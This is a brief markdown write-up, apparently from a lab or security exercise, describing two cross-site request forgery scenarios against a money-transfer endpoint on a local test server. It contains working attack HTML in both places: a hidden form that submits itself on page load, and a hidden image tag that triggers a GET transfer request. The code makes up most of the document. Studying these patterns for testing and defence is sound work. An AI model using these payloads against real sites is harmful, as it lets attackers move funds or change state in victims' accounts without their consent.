# CSRF Payloads & Exploitation Scenarios

## Exploitation Scenario 1: Auto-Submitting Hidden HTML Form
An attacker hosts a malicious HTML page (`exploit.html`). When an authenticated victim visits this page, JavaScript automatically triggers the submission of a hidden POST request to the application's transfer endpoint (`http://localhost:8080/transfer`). The browser includes the victim's session cookies, completing the transaction without user interaction.

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Exploit</title>
</head>
<body onload="document.getElementById('csrf-form').submit();">
    <form id="csrf-form" action="http://localhost:8080/transfer" method="POST">
        <input type="hidden" name="amount" value="1000">
    </form>
</body>
</html>
```

## Exploitation Scenario 2: Cross-Origin Embedded Endpoint Request
If the state-changing endpoint accepts parameter inputs via GET requests or embedded resources, an attacker can embed the transfer URL in an image tag or iframe on an external site/forum. When the victim loads the page, the browser issues a background request with active cookies.

```html
<img src="http://localhost:8080/transfer?amount=1000" style="display:none;" />
```